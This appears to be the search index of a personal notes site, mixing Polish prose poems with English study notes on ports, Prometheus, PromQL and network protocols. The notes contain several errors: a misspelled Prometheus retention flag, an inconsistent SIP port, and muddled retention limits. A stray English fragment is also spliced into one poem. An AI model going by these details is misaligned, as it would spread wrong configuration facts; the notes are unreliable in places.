maluje transparentnym b\u0142yszczykiem \u201cwygl\u0105daj\u0105 na nieco rozmyte\u201d czasu do wyj\u015bcia coraz mniej spalam papierosa ostatnie spojrzenie \u0142agodny u\u015bmiech lustro og\u0142asza remis</p> <p>\u201cDzi\u015b ja poprowadz\u0119\u201c</p> <p>Zapach migda\u0142\u00f3w i dzikich r\u00f3\u017c roznosi si\u0119 po ca\u0142ym mieszkaniu plastry miodu odrywaj\u0105 si\u0119 i spadaj\u0105 z sufitu wszystko si\u0119 lepi \u0142\u00f3\u017cko obsiad\u0142y pszczo\u0142y na satynowej po\u015bcieli skrzyde\u0142kami wybrz\u0119kuj\u0105 grzeszyny rytm w ustach wyczuwam nuty porannej kawy owoce liczi orzechy czekolada to staje si\u0119 nie do zniesienia musz\u0119 wzi\u0105\u0107 prysznic szybko \u015bci\u0105gam z siebie przepocone ubranie wchodz\u0119 do kabiny odkr\u0119cam wod\u0119 czuje jak jej kropelki docieraj\u0105 do ognisk mojego cia\u0142a jak para wodna powoli zaspokaja sk\u00f3r\u0119 odrobina cielistego \u017celu \u015bwiadomo\u015b\u0107 oddala si\u0119 coraz bardziej zamykam oczy przypominaj\u0105 mi si\u0119 aromaty brzozy i kardamonu tak typowe dla ciebie niezmienne blakn\u0105ce w \u015bwietle dnia widz\u0119 jak wiruje w ta\u0144cu niedopowiedze\u0144 udaj\u0105c \u017ce wszystko jest ok zbyt nie\u015bmia\u0142a by powiedzie\u0107 pass pora si\u0119 obudzi\u0107 owini\u0119ta czerwonym r\u0119cznikiem odurzona ilo\u015bci\u0105 wra\u017ce\u0144 delikatnie szeptam ci na ucho \u201cDzi\u015b ja poprowadze\u201d</p> <p>\u201cPrzyjaciele\u201d</p> <p>Wchodz\u0119 do kawiarni zajmuje miejsce sprawdzam godzin\u0119 za pi\u0119tna\u015bcie trzecia szed\u0142em najwolniej jak potrafi\u0142em a i tak zosta\u0142 jeszcze kwadrans rozgl\u0105dam si\u0119 dooko\u0142a towarzyszy mi uczucie pustki nikt nie lubi je\u015b\u0107 w samotno\u015bci do stolika podchodzi kelnerka zam\u00f3wi\u0142bym drinka zawsze \u0142atwiej si\u0119 nam wtedy rozmawia\u0142o urwane zdania ciche pragnienia mogli\u015bmy zrzuci\u0107 to na lekki szum w naszych g\u0142owach jednak doros\u0142o\u015b\u0107 bierze g\u00f3r\u0119 poprosz\u0119 kaw\u0119 i sernik z rodzynkami pani powolnym krokiem odchodzi od stolika jaki\u015b ch\u0142opak obok pr\u00f3buje skra\u015b\u0107 buziaka swojej dziewczynie za szyb\u0105 lataj\u0105 fotografie naszych wsp\u00f3lnych prze\u017cy\u0107 nie ma na nich dok\u0142adnie wyrysowanych twarzy wszystko jest p\u0142ynne i kolorowe bardzo chcia\u0142bym powiedzie\u0107 tak po ludzku \u017ce \u017ca\u0142uje ale wiem \u017ce nie by\u0142em gotowy wszystko ma sw\u00f3j czas kelnerka przynosi zam\u00f3wienie s\u0142ysze jak otwieraj\u0105 si\u0119 drzwi wchodzisz nieco poszarza\u0142a odrobin\u0119 zakurzona w lekko rozczochranych w\u0142osach do twarzy ci w codzienno\u015bci rozpoczynasz rozmow\u0119 od tak poprostu jak zawsze pozorne b\u0142ahostki odczucia wra\u017cenia wchodzimy coraz g\u0142\u0119biej stopniowo jeste\u015bmy coraz bli\u017cej oboje czujemy to samo co\u015b si\u0119 ko\u0144czy m\u00f3g\u0142bym zrobi\u0107 co\u015b \u017ceby\u015b zosta\u0142a mo\u017ce ty sama chcia\u0142aby\u015b posiedzie\u0107 tu jeszcze pi\u0119\u0107 minut jestem niezdecydowany ty zdajesz si\u0119 to dostrzega\u0107 i otwarcie wysy\u0142asz mi \u0142agodny u\u015bmiech z nas dwojga to dojrzalsze na mnie ju\u017c pora m\u00f3wi\u0119 spokojnie jeszcze przez chwil\u0119 patrzymy si\u0119 na siebie dzi\u0119kuj\u0105c \u017ce doszli\u015bmy do ko\u0144ca \u017ce nie ma nic po ostatecznie wychodz\u0119 sam bez \u017calu nios\u0105c na plecach worek wspomnie\u0144 worek pi\u0119knych wspomnie\u0144</p>"},{"location":"docs/poetry/ostanie_lato/","title":"ostanie lato","text":"<p>S\u0142oneczny dotyk wyciszy\u0142 wzburzone emocje wakacyjna koszula powiewa w rytm nadmorskiej bryzy delikatnie trace percepcje \u0142agodna mgie\u0142ka roznosi si\u0119 po pokoju zapach \u015bwie\u017cych pomara\u0144czy prosto od prady k\u0119s po k\u0119sie wgryzam si\u0119 w ich struktur\u0119 s\u0142odycz osadza si\u0119 na z\u0119bach niczym nie zm\u0105cony letarg tylko czasami mo\u017cna odczu\u0107 chwilowe szczypanie ust jakbym o czym\u015b zapomnia\u0142 pomara\u0144czowa fala orze\u017awienia Co b\u0119dzie w pa\u017adzierniku? na zewn\u0105trz 36 stopni telefon a\u017c wibruje kto\u015b pr\u00f3buje si\u0119 do mnie dodzwoni\u0107 w s\u0142uchawce s\u0142ysz\u0119 szum puszystej piany soczysty poca\u0142unek white lady tak mija mi to ostatnie lato \u2026</p>"},{"location":"docs/poetry/przyjaciele/","title":"przyjaciele","text":"<p>\u201cPrzyjaciele\u201d</p> <p>Wchodz\u0119 do kawiarni zajmuje miejsce sprawdzam godzin\u0119 za pi\u0119tna\u015bcie trzecia szed\u0142em najwolniej jak potrafi\u0142em a i tak zosta\u0142 jeszcze kwadrans rozgl\u0105dam si\u0119 dooko\u0142a towarzyszy mi uczucie pustki nikt nie lubi je\u015b\u0107 w samotno\u015bci do stolika podchodzi kelnerka zam\u00f3wi\u0142bym drinka zawsze \u0142atwiej si\u0119 nam wtedy rozmawia\u0142o urwane zdania ciche pragnienia mogli\u015bmy zrzuci\u0107 to na lekki szum w naszych g\u0142owach jednak doros\u0142o\u015b\u0107 bierze g\u00f3r\u0119 poprosz\u0119 kaw\u0119 i sernik z rodzynkami pani powolnym krokiem odchodzi od stolika jaki\u015b ch\u0142opak obok pr\u00f3buje skra\u015b\u0107 buziaka swojej dziewczynie za szyb\u0105 lataj\u0105 fotografie naszych wsp\u00f3lnych prze\u017cy\u0107 nie ma na nich dok\u0142adnie wyrysowanych twarzy wszystko jest p\u0142ynne i kolorowe bardzo chcia\u0142bym powiedzie\u0107 tak po ludzku \u017ce \u017ca\u0142uje ale wiem \u017ce nie by\u0142em gotowy wszystko ma sw\u00f3j czas kelnerka przynosi zam\u00f3wienie s\u0142ysze jak otwieraj\u0105 si\u0119 drzwi wchodzisz nieco poszarza\u0142a odrobin\u0119 zakurzona w lekko rozczochranych w\u0142osach do twarzy ci w codzienno\u015bci rozpoczynasz rozmow\u0119 od tak poprostu jak zawsze pozorne b\u0142ahostki odczucia wra\u017cenia wchodzimy coraz g\u0142\u0119biej stopniowo jeste\u015bmy coraz bli\u017cej oboje czujemy to samo co\u015b si\u0119 ko\u0144czy m\u00f3g\u0142bym zrobi\u0107 co\u015b \u017ceby\u015b zosta\u0142a mo\u017ce ty sama chcia\u0142aby\u015b posiBaisic mait transfer fucntionality edzie\u0107 tu jeszcze pi\u0119\u0107 minut jestem niezdecydowany zdajesz si\u0119 to dostrzega\u0107 i otwarcie wysy\u0142asz mi \u0142agodny u\u015bmiech z nas dwojga to dojrzalsze na mnie ju\u017c pora m\u00f3wi\u0119 spokojnie jeszcze przez chwil\u0119 patrzymy si\u0119 na siebie dzi\u0119kuj\u0105c \u017ce doszli\u015bmy do ko\u0144ca \u017ce nie ma nic po ostatecznie wychodz\u0119 sam bez \u017calu nios\u0105c na plecach worek wspomnie\u0144 worek pi\u0119knych wspomnie\u0144</p>"},{"location":"docs/poetry/zabilemCzlowieka/","title":"zabilemCzlowieka","text":"<p>\u201cMamo zabi\u0142em cz\u0142owieka\u201d Niecodziene slowa jak na przedszkolaka Po kolana utopionego w farbie \u2019Przy\u0142o\u017cy\u0142em mu p\u0119dzel do g\u0142owy\u201d</p> <p>ssI p\u0119\u0142k\u201d Mo\u017ce chcial na mnie zrobi\u0107 wra\u017cenie</p>"},{"location":"docs/ports/port_0/","title":"port 0","text":""},{"location":"docs/ports/port_0/#port-0","title":"Port 0","text":"<p>It\u2019s a specail port desiunged for dynamical routing - Trying to bind to port 0 will trigger an Os Scan for an avaiable port wich then bounds it to the app</p> <p>[!quote] rust_tests|ports|TCP</p>"},{"location":"docs/ports/ports/","title":"Ports","text":""},{"location":"docs/ports/ports/#ports","title":"Ports","text":"<p>Port numbers designate where a packet will be delivered. The location of the service on a particular device. They are handed to the service that manages these port numbers. </p> <p>1</p>"},{"location":"docs/ports/ports/#port-types","title":"Port Types","text":"<ul> <li>Well-Known Ports (Permanent port numbers)     ==Ports 0 through 1,023==<ul> <li>Usually used on servers or services:<ol> <li>HTTP (port 80)</li> <li>HTTPS (port 443)</li> </ol> </li> </ul> </li> <li>Ephemeral Ports (Temporary port numbers)     ==Ports 1,024 through 65,535==</li> </ul> <p>[!bug] Ports are for communication, not security. They need to be well-known. Also, TCP ports are not the same as UDP ports.</p> <p>2</p>"},{"location":"docs/ports/ports/#managing-the-data","title":"Managing the Data","text":"<p>Different ports help differentiate the type of data being transferred. </p> <p>3</p>"},{"location":"docs/ports/ports/#common-ports","title":"Common Ports","text":"Port Name Function tcp/23 Telnet Connecting to the container tcp/22 SSH Connecting to the container udp/53 or tcp/53 (for large transfers) DNS Convert names to IP addresses tcp/25 (plain text) or tcp/587 (encrypted) SMTP Server to server email transfer tcp/22 SFTP Encrypted file transfer tcp/20 (active mode data), tcp/21 (control) FTP Transfers files between systems udp/67 and udp/68 DHCP Automated configuration of IP and subnet mask TCP /80 HTTP Web server communication TCP /443 HTTPS Web server with encryption UDP /161 SNMP Gather statistics from network devices TCP /3389 RDP Remote connection to the desktop UDP /123 NTP Synchronize the clocks of the system TCP /5060 and /5061 SIP Phone calls ICMP Internet Control Message Protocol SQL Server /1433 SMB /445 Server Message Block Used for printers and routers in Windows <p>Web Sockets | UDP | TCP | Port Scanning</p>"},{"location":"docs/prometheus/alert_menager/","title":"Alert manager","text":"<p>Alert Menager is confgiured via cmd-flags and configuration file</p>","tags":["prometheus"]},{"location":"docs/prometheus/alert_menager/#configuration-options","title":"Configuration options","text":"<p>Docs Alert menager configuration - Routing - Where to send alerts - Aggregation of alerts - Trhothiling of alerts - Muting of alerts - Inhibition settings - Mutes other alers when an alert matches other machines - Label matchers - Alerts to route - Silencers - Inhibition rules <code>amtool</code> can act as a linter and verify configuration is correct</p>","tags":["prometheus"]},{"location":"docs/prometheus/alert_menager/#alerting-baisics","title":"Alerting baisics","text":"<ul> <li>Must use camelCase</li> <li>Severity should be using a labeld called serverity<ul> <li>Critical-Routed (imidiete action)</li> <li>Warning-Routed</li> <li>Info-NotRouted</li> </ul> </li> <li>Shoud have this annotations<ul> <li>Summery(mandatory) alert anem</li> <li>Descirpotion (mandatory) detailed descreption of an alert ###     When to alert people Slis Slas     Slos</li> </ul> </li> </ul> <ul> <li>prometheus</li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/export_prom_metrics/","title":"Export Prometheus Metrics","text":"<p>Docs</p> <p>Article</p> <p>U can export any sort of the records to the prometheus</p> <p>U have to build the given endpoit using <code>prometheus client</code></p> <p>Repo</p>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/","title":"Prometheus","text":"<p>Not a logging tool just time series db # Installation - Normal way Docs</p> <p>Promethues is a service account, remeber to dislable it\u2019s shell</p> <pre><code>sudo useradd -M -r -s /bin/false prometheus\n</code></pre> <ul> <li>With ansible -Ansible     Playbook</li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#structure","title":"Structure","text":"<ul> <li>Uses     PromeQl     query language</li> <li>It\u2019s based on the time series     db (saved on the main     node)<ul> <li>Exporters pulls the data over the http form the nodes</li> </ul> </li> <li>Targets are dicovered via service discovery or static     configuration &gt;U need to hve Prometheus server on main     node &gt;And Node     Exporter     on the others &gt;</li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#nodes","title":"Nodes","text":"<ul> <li>They are simply called instances(any endpoint u can scrape)<ul> <li>They can be setup via the jsonfiles</li> </ul> </li> <li>Jobs<ul> <li>collections of instances</li> </ul> </li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#push-vs-pull","title":"Push vs pull","text":"<p>Aritcle</p>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#push-refers-to-the-end-point-pushing-data-into-promethues","title":"Push *Refers to the end point pushing data into promethues","text":"<p>instance*</p> <p>!It\u2019s not a prefered method! - If u must push, therse a <code>Protemtheus Push Gateway</code> - This is not a agregator or distributed coutnter it\u2019s a <code>metric cache</code> - !Pushed metrics are never removed without mannual purge! #### Pull Refers to the end point presenting http inforamtion and then having the promethues isntance scrape the data into database - Natively checks weather the node is down (becouse it\u2019s pulling data obviously) - They roate if the scrapes are deleted ##### Retention time By defualt it st</p> <pre><code>--storage.tsdb.retatnion.time 31\\\n</code></pre>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#service-discovery","title":"Service discovery","text":"<p>Can be either <code>File based</code> or <code>Http Based</code> - File based via node exporter ### Service - deuflt adress http://localhost:9100/metrics - can be any ohter port - Http based - U can add any metric/data u want - Response must be 200 - Contnent-Type must be application/json - Body must be valid JSON &gt;</p>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#tracing-and-spans","title":"Tracing and spans","text":"<ul> <li><code>Trace</code> the hole journey of the request actions as it moves through     all nodes in distributed stysem</li> <li><code>Spans</code> operation or work taking place on a service , web server     responding to an individual request or function</li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#logging","title":"Logging","text":"<p>By fefualt the prometheus logs to the <code>/var/log/prometheus</code></p>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#slos-slis-slas","title":"Slos Slis Slas","text":"<p>Service Level Objectives</p>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#prometheus-limitaion","title":"Prometheus limitaion","text":"<ul> <li>LTS a 10 year cycle</li> <li>Every ^ weeks new minor realease cycle begins Local storage</li> <li>It\u2019s not clustered or repliceated so needs to be treaded like a disk</li> <li>Compaction happens in the background<ul> <li>Initial 2h block are eventualy commpacted into longer blocks in     the background</li> <li>10% of data retatnion</li> <li>32 days which ever is smaller</li> </ul> </li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#dashboarding-basics","title":"Dashboarding Basics","text":"<p>Instead of showing everything at once spilt it based on purpose - No more the 5 graphs on a console - No more hten 5 lines on each graph - Avoid mire then 20-30 entires in the rig-hand-sid table</p>","tags":["prometheus"]},{"location":"docs/prometheus/prometheus_main/#full-prometheus-model","title":"Full Prometheus Model","text":"","tags":["prometheus"]},{"location":"docs/prometheus/promql/","title":"Promql","text":"<p>Cheat sheet and labs</p>","tags":["prometheus"]},{"location":"docs/prometheus/promql/#data-models-and-lablse","title":"Data Models and Lablse","text":"<ul> <li><code>Metrics Names</code> Specyige the general feature of system taht is     mesaured(http_request_toatl)</li> <li><code>Metrics Lables</code> Enable Prometheus dimensional data modle to     ideentyfie any given combination of labes for the same metiric anem<ul> <li>Can\u2019t use __ resrved for the internal testing</li> </ul> </li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/promql/#datatypes","title":"DataTypes","text":"<ul> <li><code>Stirng</code></li> <li><code>Scalar</code> int</li> <li><code>Vectors</code></li> <li><code>Instant vector</code> (One value )<ul> <li>Every 30s <code>[30]</code></li> </ul> </li> <li><code>Range vectors</code>(Multiples values)<ul> <li>From yesterday to now</li> </ul> </li> <li> <p><code>Counter</code> (sotres a metric that will increase over time and     total amount of them)</p> <ul> <li>If metrics is a <code>total</code> then this is <code>counter</code><ul> <li>Example: alter_menager_recived_total</li> </ul> </li> <li>shoudln\u2019t be used for decrease</li> <li>Returns <code>Instant Vector</code></li> <li>Examples request count or error count</li> </ul> <p>total number of the metrics over desired period <code>bash rate(counter_name [last_period_of_time])</code></p> <ul> <li><code>increase</code> (how much a counter has gone up over a certain     period of time)<ul> <li>Imagine you have a counter for disk flush requests: At the     start of the day, the counter is at 100. By the end of the     day, it\u2019s at 300. The increase is 200</li> </ul> </li> <li><code>Gauge</code> (metrics that go up and down)</li> <li>Cpu Usage,memory usage ,response time</li> <li>Usually an input to the agregaitng functions like avrage over     time</li> </ul> </li> </ul> <pre><code>avg_over_time(http_response_time[5m])\n</code></pre> <ul> <li><code>Hisotgram</code> put data in a specyfic buckets(has to be     predefined)<ul> <li>Stores total number of metrics<ul> <li>Sum of values</li> </ul> </li> <li>If metrics is a <code>bucket</code> then this is <code>histogram</code><ul> <li>Example: prometheus_http_response_size_bytes_bucket</li> </ul> </li> <li> <p>Better visualisation</p> <ul> <li>predefined functions for procentails</li> </ul> <p><pre><code>Hisotgram_qunatilne(0.95,sum(rate(request_duration_buckets))by(le))\n</code></pre> -   <code>Summery</code>(if u don\u2019t know the exact value of the buckets)     -   Response times     -   Respnse size     -   Bytes exchanged     -   ReadIO ## Filters -   Based on labels</p> </li> </ul> </li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/promql/#rates-and-derivities","title":"Rates and Derivities","text":"<p><code>rate()</code> Stable increase of vector <code>irate()</code> The same as vecotrs unless spikes <code>derive</code> desinged to show changes more for an aletr then the daschboard</p>","tags":["prometheus"]},{"location":"docs/prometheus/promql/#cpu-usage-over-the-last-cpu","title":"Cpu usage over the last cpu","text":"<pre><code>sum by(cpu)(rate(node_cpu_seconds_total{mode!=\"idle\"}[5m]))*100\n</code></pre> <pre><code>sum by(path)(rate(http_request_total{status=\"500\"} [1d]))\n</code></pre>","tags":["prometheus"]},{"location":"docs/prometheus/promql/#aggregation-over-dimmesions","title":"Aggregation over dimmesions","text":"<ul> <li>lables add dimension to the dataset http_request_total has 3     lables application instance grouop**</li> <li>Get all the labes</li> </ul> <pre><code>sum(http_request_total)\n</code></pre> <ul> <li>Exclude instaces</li> </ul> <pre><code>sum(http_request_total) without(instance)\n</code></pre> <ul> <li>or based on another group</li> </ul> <pre><code>sum by (application_group)(http_request_total)\n</code></pre>","tags":["prometheus"]},{"location":"docs/prometheus/promql/#timestamps-metrics","title":"Timestamps Metrics","text":"<p><code>timestamps</code> are given in <code>epoch time</code> and can be queried for instant vector - How fresh the data is</p> <pre><code># So this will give u the raw data to \ntimestamp(go_memstat_frees_total)\n\n# To get human readable time use \ntime() - timestamp(go_memstat_frees_total)\n</code></pre>","tags":["prometheus"]},{"location":"docs/prometheus/promql/#base-units","title":"Base units","text":"","tags":["prometheus"]},{"location":"docs/prometheus/push_gatway_prometheus/","title":"Push gatway prometheus","text":"","tags":["prometheus"]},{"location":"docs/prometheus/push_gatway_prometheus/#constraints","title":"Constraints","text":"<ul> <li>Monitoring multiple instances through a single Pushgateway creates     both a single point of failure and a potential bottleneck.</li> <li>Loss of Prometheus automatic instance health via the <code>up</code> metric     (generated on every scrape).</li> <li>The Pushgateway never forgets series pushed to it.<ul> <li>You have to delete them manually.</li> </ul> </li> </ul> <p>Prom Docs </p>","tags":["prometheus"]},{"location":"docs/prometheus/service_instrumentation/","title":"Service instrumentation","text":"<p>What stats should give u every library serice or subsystme</p>","tags":["prometheus"]},{"location":"docs/prometheus/service_instrumentation/#service-types","title":"Service types","text":"<ul> <li><code>Online serving system</code> Humans use and expect immidiete response</li> <li><code>Offline proccesing</code> No one waiting for the response</li> <li><code>Batch jobs</code> offline proccesing may be done in batch no run     continously</li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/service_instrumentation/#subsystems","title":"Subsystems","text":"<p>Sub-parts of the service - Libraries (no additional configuration should be done this) - Track query count, errors, and latency if calling outside resource. - Internal errors, latency, and general statistics. - Logging - Every line of logging code should increment a counter somewhere.</p> <ul> <li> <p>Failures (every failure should increment a counter)</p> </li> <li> <p>Threadpools (Tracks queries, number of threads in use, number     of threads)</p> </li> <li> <p>Caches (track queries, hits, misses, and overall latency)</p> </li> <li> <p>Collectors (Export gauge for how long the collection took in     seconds)</p> </li> </ul>","tags":["prometheus"]},{"location":"docs/prometheus/service_instrumentation/#check-black-box-exporter-container","title":"Check black box exporter container","text":"","tags":["prometheus"]},{"location":"docs/prometheus/slos_slas_slis/","title":"slis slas slos","text":""},{"location":"docs/prometheus/slos_slas_slis/#slis","title":"SLIS","text":"<p>Service Level Indicators Quantitative measure of some aspect of the level of service that is provided: - Request Latency - Error Rate</p> <p>Standardized Indicators - Frequency (every 10 seconds) - Data-access Latency (time to last byte) - Aggregation Intervals (averaged over 1 minute)</p>"},{"location":"docs/prometheus/slos_slas_slis/#slas","title":"SLAS","text":"<p>Service Level Agreements - Explicit or implicit contracts with your users regarding how your service will perform against service level objectives. - Can include consequences for missing targets.</p>"},{"location":"docs/prometheus/slos_slas_slis/#slos","title":"SLOS","text":"<p>Service Level Objectives - Look at service level indicators from a lower bound to an upper bound. Alert menager</p>"},{"location":"docs/protocols/DHCP_protocol/","title":"DHCP protocol","text":""},{"location":"docs/protocols/DHCP_protocol/#dynamic-host-configuration","title":"Dynamic Host Configuration","text":"<ul> <li>UDP /67     ,UDP /68</li> <li>Requiers a DHCP server<ul> <li>In home this is incorporated to your home router</li> </ul> </li> </ul> <p>1</p>"},{"location":"docs/protocols/DHCP_protocol/#assainging-ip","title":"Assainging Ip","text":""},{"location":"docs/protocols/DHCP_protocol/#dynamic-pooled","title":"Dynamic / pooled","text":"<ul> <li>IPv4     address     are assaigned in real-time from a pool</li> <li>Each system is given a ip for a certian amout of time and must renew     at set intervals</li> </ul>"},{"location":"docs/protocols/DHCP_protocol/#dhcp-reservation","title":"DHCP reservation","text":"<ul> <li>Addresses are assigned by MAC address in the DHCP     server </li> <li>Quickly manage adresses from one location</li> </ul> <p>2 </p> <p>3</p>"},{"location":"docs/protocols/DHCP_protocol/#managing-dhcp-in-the-enterprise","title":"Managing DHCP in the enterprise","text":"<p>Limited connections - Uses IPv4 address broadcast domain - Stops at router Multiple servers neeeded for redundacy - Across diffrent location Scalibity is always an issue - May not want to mangae DHCP server in every remote location 4</p>"},{"location":"docs/protocols/DHCP_protocol/#ip-helper","title":"IP helper","text":"<p> 5</p> <p>[!quote] [[ports#Common ports]]</p>"},{"location":"docs/protocols/FTP_protocol/","title":"FTP protocol","text":""},{"location":"docs/protocols/FTP_protocol/#file-transfer-protocl","title":"File transfer Protocl","text":"<ul> <li>tcp/20(active mode data) tcp/21)(control)<ul> <li>==Active== is when we transfer the file</li> <li>==Control== tells the system wchich file to send</li> </ul> </li> <li>Usage<ul> <li>Transfer files between systems</li> <li>Authenticates with username and password</li> <li>Fulle-featured functionality (list , add, delete, etc.)</li> </ul> </li> <li>Simple alterative is     TFTP_protcol</li> </ul> <p>[!quote] [[ports#Common ports]]</p>"},{"location":"docs/protocols/HTTP/","title":"HTTP","text":""},{"location":"docs/protocols/HTTP/#hypertex-transfer-protocol","title":"Hypertex Transfer Protocol","text":"<ul> <li>Communciation in the browser and by other applications</li> </ul> <p>[!quote] HTTPS carrige_return</p>"},{"location":"docs/protocols/HTTPS/","title":"HTTPS","text":"<ul> <li> <p>Etag</p> </li> <li> <p>HTTP</p> </li> <li> <p>Carige Return</p> </li> <li> <p>NTP</p> </li> </ul>"},{"location":"docs/protocols/IMAP4/","title":"Internet Message Access Protocol v4","text":"<ul> <li>TCP/143 (plain text), TCP/993 IMAP over TLS SSL.md</li> <li>Includes management of email inbox from multiple clients<ul> <li>You can delete an email on one device, and it will be deleted on     all other devices.</li> </ul> </li> </ul> <p>[[Ports#Common ports]] POP3</p>"},{"location":"docs/protocols/NTP_protocol/","title":"NTP protocol","text":""},{"location":"docs/protocols/NTP_protocol/#network-time-protocol","title":"Network Time Protocol","text":"<ul> <li>Synchronizing the clocs of the system<ul> <li>Log files authentication outage deatails</li> </ul> </li> <li>Automatic Updates<ul> <li>No flasching 12:00 lights  </li> </ul> </li> <li>Switches routers firewalls servers and workstatio     UDP /123<ul> <li>Every device has it\u2019s own clock</li> </ul> </li> <li>Flexible<ul> <li>You control how clocks beeing updated</li> </ul> </li> </ul>"},{"location":"docs/protocols/NTP_protocol/#stratum","title":"Stratum","text":"<p>The distance from the original clock refrence Accuracy of an NTP server - Some clock are more accurate then others - Straum 0 if u define the time - Straum 1 synchornized with the straum 0</p>"},{"location":"docs/protocols/NTP_protocol/#configuring","title":"Configuring","text":"<p>NTP cleint - Specyfie the NTP server addres - Use multiple NTP servers ## NTP server</p> <ul> <li>listens to UDP /123<ul> <li>Need at leas one clock source</li> <li>Specyfiy the stratum level of choice<ul> <li>Response to time request from NTP clients</li> <li>==Does not modify their own time==</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/protocols/NTP_protocol/#ntp-client","title":"NTP client","text":"<ul> <li>Request time updates form NTP server</li> </ul>"},{"location":"docs/protocols/NTP_protocol/#ntp-clientserver","title":"NTP client/server","text":"<ul> <li>Requests time updates from an NTP server</li> <li>Responds to time request from other NTP clients</li> </ul> <p>Important to plan NTP stategy while creatin an network</p>"},{"location":"docs/protocols/POP3/","title":"POP3","text":""},{"location":"docs/protocols/POP3/#post-office-protocol-v3","title":"Post Office Protocol v3","text":"<ul> <li>TCP/110 (plain text)</li> <li>TCP/995 POP3 over TLS SSL.md</li> </ul>"},{"location":"docs/protocols/POP3/#usage","title":"Usage","text":"<p>Basic mail transfer functionality. It ==does not offer many possibilities for managing data==; therefore, IMAP4 is used more often.</p> <p>[[Ports#Common ports]]</p>"},{"location":"docs/protocols/RDP_protocol/","title":"RDP protocol","text":""},{"location":"docs/protocols/RDP_protocol/#remote-desktop-protocol","title":"Remote Desktop Protocol","text":"<ul> <li>Share a desktop from a remote lovation over     TCP/3389</li> <li>Remote Desktop Services on many Windows versions<ul> <li>Can connect to an entire desktop or just an application</li> <li>Clients for Windows MAc Iphon Linux can connect easily</li> </ul> </li> </ul> <p>[[ports#Common ports]]</p>"},{"location":"docs/protocols/SIP_protocol/","title":"SIP protocol","text":""},{"location":"docs/protocols/SIP_protocol/#session-initiation-protocol","title":"Session Initiation Protocol","text":"<ul> <li>Voice over IP (VoIP) signaling<ul> <li>TCP /5056 TCP /5061</li> </ul> </li> <li>Setup and manage VOIP sessions<ul> <li>Call rin hang up</li> </ul> </li> <li>==Extended voice communication==<ul> <li>Video conferencing</li> <li>Instant messaging</li> <li>File Transfer</li> </ul> </li> </ul> <p>[!quote] [[ports#Common ports]]</p>"},{"location":"docs/protocols/SMTP_protocol/","title":"SMTP protocol","text":""},{"location":"docs/protocols/SMTP_protocol/#simple-mail-transfer","title":"Simple Mail transfer","text":"<ul> <li>==Server to server== email transfer</li> </ul>"},{"location":"docs/protocols/SMTP_protocol/#other-protocols-for-clients","title":"Other protocols for clients","text":"<p>POP3</p> <p>IMAP4 &gt;[!quote]</p>"},{"location":"docs/protocols/SNMP_protocol/","title":"SNMP protocol","text":""},{"location":"docs/protocols/SNMP_protocol/#simple-network-mangment-protocol","title":"Simple network mangment protocol","text":"<ul> <li>Gather statistic form network devices<ul> <li>UDP /161</li> </ul> </li> </ul> <p>[!example]- </p> <ul> <li>V3 A secure standard<ul> <li>Message integrity</li> <li>Authentication</li> <li>Encryption</li> </ul> </li> <li>Alerts and notyfication from the network deviceses<ul> <li>UDP 162</li> </ul> </li> </ul> <p>[!quote] [[ports#Common ports]] SysLog</p>"},{"location":"docs/protocols/TFTP_protcol/","title":"TFTP protcol","text":""},{"location":"docs/protocols/TFTP_protcol/#trivial-file-transfer-protocol","title":"Trivial File Transfer Protocol","text":"<ul> <li>UDP/69 </li> <li>Very simple file transfer application<ul> <li>Read files and wirte files</li> </ul> </li> <li>==No authentucation==<ul> <li>Not used on productions systems</li> </ul> </li> </ul> <p>[!quote] FTP_protocol [[ports#Common ports]]</p>"},{"location":"docs/protocols/TLS_SSL/","title":"TLS SSL","text":""},{"location":"docs/protocols/TLS_SSL/#tls","title":"TLS","text":""},{"location":"docs/protocols/TLS_SSL/#alt-name-ssl-tls-add-an-extra-layer-of-encryption-to-the","title":"alt-name SSL TLS add an extra layer of encryption to the","text":"<p>HTTPS - USed in appp - Easy to implement </p> <p>TLS_session</p> <p>[!quote] sqlx 3-way Handshake</p>"},{"location":"docs/protocols/ssh/","title":"ssh","text":""},{"location":"docs/protocols/ssh/#secure-shell","title":"Secure shell","text":"<p>Looks and acts the same as a telnet but it\u2019s encrypted</p>"},{"location":"docs/protocols/ssh/#to-checkot-the-config-use","title":"To checkot the config use","text":"<pre><code> sshd -T\n</code></pre>"},{"location":"docs/protocols/ssh/#example-client-config","title":"Example Client config","text":"<pre><code>Host test\n    HostName 123.457.23\n    User test\n    Port 22\n     IdentityFile ~/.ssh/keys.pem\n</code></pre>"},{"location":"docs/protocols/ssh/#key-gen","title":"Key-gen","text":"<pre><code>ssh-keygen -t ed25519\n</code></pre> <p>[!bug] Rember about Permissions Wsl grants all the permison to a file that may casue issue becouse ssh will claim thas insecure</p> <p>The the permisons shoudl be <code>0400</code></p> <p>[!quote] ports podman docker</p>"},{"location":"docs/protocols/ssh/#ssh-tunnelspor-forwarding","title":"SSH Tunnels/Por forwarding","text":"<p>Article</p> <pre><code># -N to only mentaine the proxy  not interactable\n# -f run in the backgorund \n#ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER\n\nssh -L 5901:localhost:6969 -N -f user@remote.host\n</code></pre>"},{"location":"docs/protocols/ssh/#deufalt-message","title":"Deufalt message","text":"<p>To cusotmise your ssh message use /etc/motd</p> <ul> <li>Custom scripts can be found insider <code>/etc/update-motd.d</code><ul> <li>Docs</li> </ul> </li> </ul>"},{"location":"docs/protocols/ssh/#ssh-options","title":"Ssh options","text":"<ul> <li><code>PortDefines</code> the TCP listening port.</li> <li><code>PermitRootLoginIndicates</code> whether 